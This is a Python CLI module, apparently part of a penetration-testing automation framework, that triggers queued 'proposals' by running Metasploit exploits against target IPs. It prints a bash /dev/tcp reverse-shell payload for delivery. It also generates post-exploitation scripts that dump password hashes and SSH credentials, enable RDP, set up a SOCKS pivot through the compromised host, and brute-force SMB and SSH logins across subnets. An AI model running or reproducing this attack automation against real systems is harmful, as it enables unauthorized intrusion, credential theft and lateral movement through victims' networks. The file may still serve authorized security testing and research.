from __future__ import annotations
import glob, json, subprocess, sys
from datetime import datetime
from pathlib import Path
from skg.cli.utils import (
    _api, _proposal_backlog, _load_recall_summary,
    DISCOVERY_DIR, SKG_HOME, SKG_STATE_DIR,
)
from skg_core.config.paths import INTERP_DIR, EVENTS_DIR

REPO_ROOT = Path(__file__).resolve().parents[4]


_MODULE_PATH_MAP = {
    # Windows / network exploits
    "windows":           "host_network_exploit_v1",
    "smb/ms17_010":      "host_network_exploit_v1",
    "smb/psexec":        "host_network_exploit_v1",
    "winrm":             "host_winrm_initial_access_v1",
    # Linux privesc by technique
    "sudo":              "host_linux_privesc_sudo_v1",
    "suid":              "host_linux_privesc_suid_v1",
    "kernel":            "host_linux_privesc_kernel_v1",
    # Generic MSF post — used when no more-specific mapping applies
}


def _attack_path_from_module(module: str, pr: dict) -> str:
    """
    Derive the host projection attack-path-id from the MSF module string and
    proposal metadata.  Falls back to host_msf_post_exploitation_v1 which is
    semantically correct for any session-backed collection.
    """
    m = (module or "").lower()
    for fragment, path_id in _MODULE_PATH_MAP.items():
        if fragment in m:
            return path_id
    # Proposal may carry an explicit host_attack_path_id hint
    hint = pr.get("host_attack_path_id") or pr.get("attack_path_id", "")
    if hint.startswith("host_"):
        return hint
    return "host_msf_post_exploitation_v1"


def _run_post_projection(target_ip, events_file, run_id, attack_path_id="host_msf_post_exploitation_v1"):
    """Run host domain projection after MSF session collection."""
    try:
        proj = SKG_HOME / "skg-host-toolchain" / "projections" / "run.py"
        if not proj.exists():
            return
        interp = INTERP_DIR / f"host_{target_ip.replace('.','_')}_{run_id}.json"
        interp.parent.mkdir(parents=True, exist_ok=True)
        import subprocess as _sp
        _sp.run([sys.executable, str(proj),
                 "--in", str(events_file),
                 "--out", str(interp),
                 "--attack-path-id", attack_path_id],
                capture_output=True, timeout=30,
                cwd=str(proj.parent))
    except Exception:
        pass


def _execute_proposal(pr, action, rc, module, opts):
    """
    Execute an approved proposal via MSF RPC console.
    Runs the RC script, waits for session, runs post-collection,
    ingests all output as wicket events back into SKG state.
    """
    import time, uuid

    _pdir = SKG_STATE_DIR / "proposals"
    proposal_id  = pr.get("id","?")
    target_ip    = action.get("target_ip","")
    identity_key = action.get("identity_key","") or target_ip
    port         = action.get("port", 80)
    category     = pr.get("category","exploit")
    domain       = pr.get("domain","web")
    run_id       = str(uuid.uuid4())[:8]

    print(f"\n  [EXECUTE] Checking msfconsole...")

    # Find msfconsole
    import shutil
    msf_bin = shutil.which("msfconsole") or "/opt/metasploit-framework/bin/msfconsole"
    if not Path(msf_bin).exists():
        for candidate in ["/usr/bin/msfconsole","/opt/msf/bin/msfconsole",
                          "/usr/local/bin/msfconsole"]:
            if Path(candidate).exists():
                msf_bin = candidate
                break
    if not Path(msf_bin).exists():
        print(f"  [EXECUTE] msfconsole not found")
        pr["status"] = "triggered_manual"
        (_pdir / f"{pr['id']}.json").write_text(json.dumps(pr, indent=2))
        if rc and Path(rc).exists():
            print(f"  Run manually: msfconsole -q -r {rc}")
        return

    print(f"  [EXECUTE] Found: {msf_bin}")
    client = None  # subprocess mode, no RPC needed

    # Run exploit via subprocess msfconsole
    import sys as _sys, re, subprocess as _sp
    _sys.path.insert(0, str(SKG_HOME / "skg-gravity"))
    from gravity_field import DISCOVERY_DIR as _DC, load_wicket_states

    print(f"  [EXECUTE] Running {module} against {target_ip}:{port}...")
    events_file = _DC / f"msf_exec_{target_ip.replace('.','_')}_{run_id}.ndjson"
    session_id  = None
    output      = ""
    await_mode  = pr.get("_trigger_args", {}).get("await_session", False)
    lhost       = opts.get("LHOST", "172.17.0.1")
    lport       = opts.get("LPORT", "4444")

    try:
        if await_mode:
            # --await-session: find existing sessions and collect from them
            print(f"  [EXECUTE] Checking for active MSF sessions...")
            r_sess = _sp.run(
                [msf_bin, "-q", "-x", "sessions -l; exit"],
                capture_output=True, text=True, timeout=20
            )
            sess_out = r_sess.stdout + r_sess.stderr
            output += sess_out
            m = re.search(r"^\s*(\d+)\s+(meterpreter|shell)", sess_out, re.M)
            if m:
                session_id = m.group(1)
                print(f"  [EXECUTE] ✓ Active session {session_id} found")
            else:
                print(f"  [EXECUTE] No active sessions found.")
                print(f"  Make sure the listener is running and payload was delivered.")
                print(f"  Run the listener: msfconsole -q -r {rc}")
                _delivery_url = action.get("delivery_url") or action.get("web_url") or f"http://{target_ip}/"
                print(f"  Deliver payload to: {_delivery_url}")
                print(f"  Reverse shell:      ; bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'")
                print(f"  Then retry:         skg proposals trigger {pr['id'][:8]} --await-session")

        elif rc and Path(rc).exists():
            is_listener = module == "exploit/multi/handler"
            if is_listener:
                # Listener-style proposals stay in the background while the
                # operator delivers the already-confirmed payload.
                log_file = _DC / f"msf_listener_{target_ip.replace('.','_')}_{run_id}.log"
                print(f"  [EXECUTE] Starting listener in background...")
                with open(log_file, "w") as lf:
                    proc = _sp.Popen([msf_bin, "-q", "-r", rc], stdout=lf, stderr=lf)
                time.sleep(4)
                if proc.poll() is None:
                    print(f"  [EXECUTE] ✓ Listener running (PID {proc.pid}), log: {log_file.name}")
                else:
                    print(f"  [EXECUTE] ✗ Listener exited — see {log_file.name}")
                print()
                print(f"  ── Deliver payload ─────────────────────────────────────")
                _delivery_url = action.get("delivery_url") or action.get("web_url") or f"http://{target_ip}/"
                reverse_payload = f"; bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"
                print(f"  URL:     {_delivery_url}")
                print(f"  Payload: {reverse_payload}")
                print(f"  Deliver the payload to the target, then run:")
                print(f"  skg proposals trigger {pr['id'][:8]} --await-session")
                print()
                print(f"  ── After shell connects ────────────────────────────────")
                print(f"  skg proposals trigger {pr['id'][:8]} --await-session")
            else:
                print(f"  [EXECUTE] Running RC synchronously (timeout 180s)...")
                r_run = _sp.run(
                    [msf_bin, "-q", "-r", rc],
                    capture_output=True,
                    text=True,
                    timeout=180,
                )
                rc_out = r_run.stdout + r_run.stderr
                output += rc_out
                # Sessions live in the RC's own stdout (sessions -l in RC).
                # A separate msfconsole invocation won't see them — don't use one.
                m = re.search(r"^\s*(\d+)\s+(meterpreter|shell)", rc_out, re.M)
                if m:
                    session_id = m.group(1)
                    print(f"  [EXECUTE] ✓ Session {session_id} opened")
                else:
                    # Also check for Meterpreter session opened message
                    m2 = re.search(
                        r"Meterpreter session (\d+) opened|"
                        r"Command shell session (\d+) opened",
                        rc_out, re.I
                    )
                    if m2:
                        session_id = m2.group(1) or m2.group(2)
                        print(f"  [EXECUTE] ✓ Session {session_id} opened (from RC output)")
                    else:
                        print(f"  [EXECUTE] No session opened from synchronous RC")

        # Post-exploitation once session is confirmed
        if session_id:
            print(f"  [EXECUTE] Running post-exploitation on session {session_id}...")
            # Detect OS from module path to pick right post modules
            is_windows = "windows" in module.lower() or "smb" in module.lower()
            is_linux   = not is_windows

            post_lines = [
                f"# SKG post-exploitation — session {session_id} on {target_ip}",
                f"",
            ]

            # ── Phase 1: Local info gather ──────────────────────────────────
            post_lines += [
                f"use post/multi/recon/local_exploit_suggester",
                f"set SESSION {session_id}", "run", "",
                f"use post/multi/gather/env",
                f"set SESSION {session_id}", "run", "",
            ]
            if is_linux:
                post_lines += [
                    "use post/linux/gather/enum_system",
                    f"set SESSION {session_id}", "run", "",
                    "use post/linux/gather/enum_sudo",
                    f"set SESSION {session_id}", "run", "",
                    "use post/linux/gather/enum_suid",
                    f"set SESSION {session_id}", "run", "",
                    "use post/linux/gather/hashdump",
                    f"set SESSION {session_id}", "run", "",
                    "use post/linux/gather/enum_network",
                    f"set SESSION {session_id}", "run", "",
                ]
            elif is_windows:
                post_lines += [
                    "use post/windows/gather/enum_system",
                    f"set SESSION {session_id}", "run", "",
                    "use post/windows/gather/credentials/domain_hashdump",
                    f"set SESSION {session_id}", "run", "",
                    "use post/windows/gather/enum_patches",
                    f"set SESSION {session_id}", "run", "",
                    "use post/windows/gather/enum_logged_on_users",
                    f"set SESSION {session_id}", "run", "",
                    "use post/windows/gather/enum_shares",
                    f"set SESSION {session_id}", "run", "",
                    "use post/windows/manage/enable_rdp",
                    f"set SESSION {session_id}", "run", "",
                ]

            # ── Phase 2: Credential gathering ───────────────────────────────
            post_lines += [
                "use post/multi/gather/ssh_creds",
                f"set SESSION {session_id}", "run", "",
            ]

            # ── Phase 3: Network pivot setup ─────────────────────────────────
            # Add route through this session so subsequent MSF modules can
            # reach internal networks via the compromised host.
            post_lines += [
                "# Set up network pivot through this session",
                f"route add 0.0.0.0/0 {session_id}",
                "",
                "# SOCKS5 proxy for external tools (curl, nmap, etc.)",
                "use auxiliary/server/socks_proxy",
                "set VERSION 5", "set SRVPORT 1080", "set SRVHOST 127.0.0.1",
                "run -j",
                "# Use: proxychains4 nmap -sT -p 80,443,22,445 <internal_range>",
                "",
            ]

            # ── Phase 4: Lateral movement surface map ────────────────────────
            if is_windows:
                post_lines += [
                    "# Scan adjacent network via pivot",
                    "use auxiliary/scanner/smb/smb_ms17_010",
                    "set RHOSTS 192.168.0.0/24", "set THREADS 10", "run", "",
                    "use auxiliary/scanner/smb/smb_login",
                    "set RHOSTS 192.168.0.0/24", "set THREADS 5",
                    "set SMBUser Administrator", "set SMBPass ''", "run", "",
                ]
            elif is_linux:
                post_lines += [
                    "use auxiliary/scanner/ssh/ssh_login",
                    "set RHOSTS file:/tmp/subnet_hosts.txt",
                    "set USERNAME root", "set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt",
                    "set THREADS 5", "run", "",
                ]

            post_lines.append("exit -y")

            post_rc = _DC / f"post_{target_ip.replace('.','_')}_{run_id}.rc"
            post_rc.write_text("\n".join(post_lines))
            r2 = _sp.run(
                [msf_bin, "-q", "-r", str(post_rc)],
                capture_output=True, text=True, timeout=240
            )
            output += r2.stdout + r2.stderr
            print(f"  [EXECUTE] Post-exploitation + pivot complete ({len(r2.stdout)} chars)")
            print(f"  [PIVOT] SOCKS5 proxy started on 127.0.0.1:1080")
            print(f"  [PIVOT] Use: proxychains4 nmap -sT <internal_range>")

    except _sp.TimeoutExpired:
        print(f"  [EXECUTE] Timeout — check: msfconsole -q -x 'sessions -l; exit'")
    except Exception as e:
        print(f"  [EXECUTE] Error: {e}")
        output += str(e)

    # Parse output into wicket events and write to DISCOVERY_DIR
    if output:
        print(f"  [EXECUTE] Ingesting {len(output)} chars of MSF output...")
        try:
            _sys.path.insert(0, str(SKG_HOME))
            from skg.sensors.msf_sensor import _parse_console_output
            workload_id = f"{domain}::{identity_key}"
            if session_id:
                workload_id = f"host::{identity_key}"
            events = _parse_console_output(output, workload_id, module)
            if events:
                with open(events_file, "w") as fh:
                    for ev in events:
                        fh.write(json.dumps(ev) + "\n")
                print(f"  [EXECUTE] {len(events)} wicket events → {events_file.name}")

                # Mirror to EVENTS_DIR for daemon FeedbackIngester
                events_dir = EVENTS_DIR
                events_dir.mkdir(parents=True, exist_ok=True)
                (events_dir / events_file.name).write_text(events_file.read_text())

                # Run projection if session opened (host domain)
                if session_id:
                    _run_post_projection(
                        target_ip, events_file, run_id,
                        attack_path_id=_attack_path_from_module(module, pr),
                    )
            else:
                print(f"  [EXECUTE] No parseable wicket events in output")
                # Write raw output for manual review
                raw = _DC / f"msf_raw_{target_ip.replace('.','_')}_{run_id}.txt"
                raw.write_text(output)
                print(f"  [EXECUTE] Raw output saved to {raw.name}")
        except Exception as e:
            print(f"  [EXECUTE] Ingest failed: {e}")
            raw = _DC / f"msf_raw_{target_ip.replace('.','_')}_{run_id}.txt"
            raw.write_text(output)
            print(f"  [EXECUTE] Raw output saved to {raw.name}")

    # Update proposal with session info
    if session_id:
        action["session_id"] = session_id
        pr["action"] = action
    pr["status"] = "executed" if output else "triggered"
    pr["executed_at"] = __import__("datetime").datetime.now(
        __import__("datetime").timezone.utc).isoformat()
    (_pdir / f"{pr['id']}.json").write_text(json.dumps(pr, indent=2))
    status = "executed" if output else "triggered_no_output"
    print(f"\n  Status → {status}")
    if session_id:
        print(f"  Session: {session_id}")
        print(f"  Next: skg proposals list  (post-exploit proposals auto-generated)")
    elif not output:
        print(f"  No session opened. Check listener setup and target reachability.")


def cmd_proposals(a):
    """Operator proposal queue — direct file read, no import dependencies."""
    subcmd = a.proposal_cmd
    PDIR = SKG_STATE_DIR / "proposals"

    def _normalize_status(pr: dict) -> dict:
        pr = dict(pr)
        status = pr.get("status", "")
        if status == "auto_executed":
            # Historical sync-exec records used auto_executed before the
            # executed/returncode path was added. Treat finished runs without
            # a live pid as executed for operator display.
            if pr.get("returncode") is not None or not pr.get("pid"):
                pr["status"] = "executed"
        if status.startswith("error_missing"):
            pr["status"] = "error_missing_rc"
        return pr

    def _load(status_filter="pending"):
        items = []
        if not PDIR.exists():
            return items
        for f in sorted(PDIR.glob("*.json")):
            try:
                d = _normalize_status(json.loads(f.read_text()))
                if status_filter is None or d.get("status") == status_filter:
                    items.append(d)
            except Exception:
                pass
        def _proposal_order_key(proposal):
            active_statuses = {"pending", "triggered", "accepted_preserved_existing"}
            status_rank = 0 if proposal.get("status") in active_statuses else 1
            growth = ((proposal.get("recall") or {}).get("growth_memory") or {})
            try:
                growth_delta = float(growth.get("delta", 0.0) or 0.0)
            except Exception:
                growth_delta = 0.0
            try:
                confidence = float(proposal.get("confidence", 0.0) or 0.0)
            except Exception:
                confidence = 0.0
            generated_ts = 0.0
            try:
                generated_ts = datetime.fromisoformat(str(proposal.get("generated_at", ""))).timestamp()
            except Exception:
                generated_ts = 0.0
            return (
                status_rank,
                -growth_delta,
                -confidence,
                -generated_ts,
            )
        return sorted(items, key=_proposal_order_key)

    if subcmd == "list":
        status = getattr(a, "status", "all")
        items  = _load(None if status == "all" else status)
        if not items:
            total = len(_load(None))
            print(f"  No {status} proposals. (Total in queue: {total})")
            return
        if status == "all":
            active_statuses = {"pending", "triggered", "accepted_preserved_existing"}
            active = [p for p in items if p.get("status") in active_statuses]
            recent = [p for p in items if p.get("status") not in active_statuses]
            print(f"\n  Active Queue: {len(active)} | Historical: {len(recent)}")
            if active:
                print("  What matters now: review pending proposals before historical records.\n")
        header = "  {:<12s}  {:<18s}  {:<14s}  {:<8s}  {:<18s}  {}".format(
            "ID", "Status", "Kind", "Domain", "Target", "Description")
        print("\n" + header)
        print("  " + "-"*12 + "  " + "-"*18 + "  " + "-"*14 + "  " + "-"*8 + "  " + "-"*18 + "  " + "-"*40)
        ordered = items
        if status == "all":
            ordered = items
        for pr in ordered:
            status_s = pr.get("status", "?")[:18]
            kind   = pr.get("proposal_kind", "field_action")[:14]
            domain = pr.get("domain", "?")[:8]
            hosts  = pr.get("hosts") or [pr.get("attack_surface","?")]
            target = str(hosts[0] if hosts else "?")[:18]
            maturity = ""
            if kind == "toolchain_gene":  # "toolchain_generation"[:14]
                m = (pr.get("maturity", {}) or {}).get("level")
                maturity = f" [{m}]" if m else ""
            desc   = (pr.get("description", "")[:40] + maturity)[:40]
            pid    = pr.get("id","")[:12]
            print(f"  {pid:12s}  {status_s:18s}  {kind:14s}  {domain:8s}  {target:18s}  {desc}")
        print("\n  {} proposal(s) | skg proposals trigger <id> | skg proposals show <id>".format(len(items)))
        return

    if subcmd == "show":
        items = _load(None)
        pr = next((p for p in items if p.get("id","").startswith(a.proposal_id)), None)
        if not pr:
            print(f"  Not found: {a.proposal_id}")
            return
        # Pretty print key fields
        print(f"\n  Proposal: {pr.get('id')}")
        print(f"  Status:   {pr.get('status')}")
        print(f"  Kind:     {pr.get('proposal_kind')}")
        print(f"  Domain:   {pr.get('domain')}")
        print(f"  Target:   {pr.get('identity_key') or pr.get('attack_surface') or pr.get('hosts')}")
        print(f"  Desc:     {pr.get('description')}")
        maturity = pr.get("maturity")
        if maturity:
            print(f"  Maturity: {maturity.get('level')} ({maturity.get('reason')})")
        if pr.get("confidence") is not None:
            print(f"  Confidence: {float(pr.get('confidence', 0.0)):.2f}")
        action = pr.get("action", {})
        if action:
            print("\nAction:")
            print(f"    instrument: {action.get('instrument')}")
            if action.get("module"):
                print(f"    module:     {action.get('module')}")
            if action.get("confidence") is not None:
                print(f"    confidence: {float(action.get('confidence', 0.0)):.2f}")
            if action.get("rc_file"):
                print(f"    rc_file:    {action.get('rc_file')}")
            hint = action.get("dispatch",{}).get("command_hint","")
            if hint:
                print(f"    run:        {hint}")
        recall_target = str(pr.get("identity_key") or (pr.get("hosts") or [None])[0] or "")
        recall = _load_recall_summary(target_filter=recall_target, limit=3) if recall_target else None
        if recall and (recall.get("confirmed") or recall.get("pending")):
            rate = recall.get("confirmation_rate")
            rate_s = f"{rate:.3f}" if rate is not None else "n/a"
            print("\nRecall:")
            print(f"    confirmed: {recall.get('confirmed', 0)}  pending: {recall.get('pending', 0)}  rate: {rate_s}")
            for rec in recall.get("recent", [])[:2]:
                print(f"    {str(rec.get('projection_confirmed','?')):10s} {str(rec.get('wicket_id','?')):12s} {rec.get('evidence_text','')[:80]}")
        if pr.get("pid"):
            print(f"  PID:      {pr.get('pid')}")
        if pr.get("returncode") is not None:
            print(f"  Exit:     {pr.get('returncode')}")
        if pr.get("log_file"):
            print(f"  Log:      {pr.get('log_file')}")
        if pr.get("events_file"):
            print(f"  Events:   {pr.get('events_file')}")
        if pr.get("events_emitted") is not None:
            print(f"  Emitted:  {pr.get('events_emitted')}")
        summary = pr.get("msf_summary") or {}
        if summary.get("findings"):
            print("  Findings:")
            for item in summary.get("findings", [])[:8]:
                print(f"    - {item}")
        if summary.get("errors"):
            print("  Notes:")
            for item in summary.get("errors", [])[:5]:
                print(f"    - {item}")
        if pr.get("ingest_error"):
            print(f"  Ingest:   {pr.get('ingest_error')}")
        return

    if subcmd == "trigger":
        if str(REPO_ROOT) not in sys.path:
            sys.path.insert(0, str(REPO_ROOT))
        from skg.forge.proposals import trigger_action
        items = _load(None)
        pr = next((p for p in items if p.get("id","").startswith(a.proposal_id)), None)
        if not pr:
            print(f"  Not found: {a.proposal_id}")
            return
        _TRIGGERABLE = {"field_action", "cognitive_action"}
        if pr.get("proposal_kind", "field_action") not in _TRIGGERABLE:
            print(f"  Proposal {pr.get('id')} kind '{pr.get('proposal_kind')}' is not triggerable")
            print(f"  Triggerable kinds: {sorted(_TRIGGERABLE)}")
            return
        # If the proposal is expired, reset it to pending so it can be triggered
        if pr.get("status") == "expired":
            import json as _json
            _pf = PDIR / f"{pr['id']}.json"
            if _pf.exists():
                pr["status"] = "pending"
                pr["generated_at"] = __import__("datetime").datetime.now(
                    __import__("datetime").timezone.utc
                ).isoformat()
                _pf.write_text(_json.dumps(pr, indent=2))
                print(f"  [TRIGGER] Revived expired proposal {pr['id'][:12]}")
        try:
            pr = trigger_action(pr["id"])
        except ValueError as _te:
            print(f"  [TRIGGER] Error: {_te}")
            print(f"  Run 'skg gravity' to generate a fresh proposal for this target.")
            return
        action = pr.get("action", {})
        rc     = action.get("rc_file","")
        module = action.get("module","")
        session= action.get("session_id","")
        opts   = action.get("options",{})
        hint   = action.get("dispatch",{}).get("command_hint","")

        print(f"\n  ── Proposal: {pr.get('id')} ──────────────────────────────────")
        print(f"  Desc:    {pr.get('description','')}")
        print(f"  Target:  {pr.get('attack_surface') or pr.get('hosts')}")
        print(f"  Domain:  {pr.get('domain','?')}  |  Category: {pr.get('category','?')}")
        if module:
            print(f"  Module:  {module}")
        if session:
            print(f"  Session: {session}")
        if opts:
            for k,v in opts.items():
                print(f"    {k} = {v}")

        if rc and Path(rc).exists():
            print(f"\n  RC script ({rc}):")
            rc_content = Path(rc).read_text()
            for line in rc_content.strip().split("\n")[:20]:
                print(f"    {line}")
            if rc_content.count("\n") > 20:
                print(f"    ... ({rc_content.count(chr(10))-20} more lines)")
            print(f"\n  Run: msfconsole -q -r {rc}")
        elif rc:
            print(f"\n  RC file: {rc}")
            print(f"  (File not found — session may have closed. Regenerate with: skg gravity)")
            print(f"\n  Manual equivalent:")
            print(f"    msfconsole -q -x 'use {module}; set SESSION {session}; run; exit'")
        elif hint:
            print(f"\n  Run: {hint}")
        elif module:
            print(f"\n  Manual run:")
            print(f"    msfconsole -q -x 'use {module}; set SESSION {session}; run; exit'")

        # cognitive_action proposals are observation recommendations — no RC execution
        if pr.get("proposal_kind") == "cognitive_action":
            hypothesis = pr.get("hypothesis", {})
            instrument = pr.get("instrument", "")
            if hypothesis:
                print(f"\n  Observation target: {hypothesis.get('wicket_id', '?')} — {hypothesis.get('label', '')}")
            if instrument:
                print(f"  Recommended instrument: {instrument}")
            print(f"\n  Run the recommended observation, then ingest results with: skg derived rebuild")
            return

        # Execute via MSF RPC and ingest results
        pr["_trigger_args"] = {"await_session": getattr(a, "await_session", False)}
        _execute_proposal(pr, action, rc, module, opts)
        return

    if subcmd == "accept":
        if str(REPO_ROOT) not in sys.path:
            sys.path.insert(0, str(REPO_ROOT))
        from skg.forge import proposals as _proposals
        try:
            result = _proposals.accept(a.proposal_id)
            print(f"  Accepted: {a.proposal_id}")
            if result.get("installed_path"):
                print(f"  Installed: {result['installed_path']}")
            if result.get("preserved_existing"):
                print("  Preserved existing: staged draft was weaker than the active toolchain")
        except Exception as exc:
            print(f"  Failed: {exc}")
        return

    if subcmd == "reject":
        if str(REPO_ROOT) not in sys.path:
            sys.path.insert(0, str(REPO_ROOT))
        from skg.forge import proposals as _proposals
        try:
            result = _proposals.reject(a.proposal_id, reason=getattr(a, "reason", ""))
            print(f"  Rejected: {a.proposal_id}")
            if result.get("cooldown_until"):
                print(f"  Cooldown until: {result['cooldown_until']}")
        except Exception as exc:
            print(f"  Failed: {exc}")
        return

    if subcmd == "defer":
        if str(REPO_ROOT) not in sys.path:
            sys.path.insert(0, str(REPO_ROOT))
        from skg.forge import proposals as _proposals
        try:
            result = _proposals.defer(a.proposal_id, days=getattr(a, "days", 7))
            print(f"  Deferred: {a.proposal_id}")
            if result.get("until"):
                print(f"  Until: {result['until']}")
        except Exception as exc:
            print(f"  Failed: {exc}")
        return

    print("  Usage: skg proposals [list|show|trigger|accept|reject|defer]")
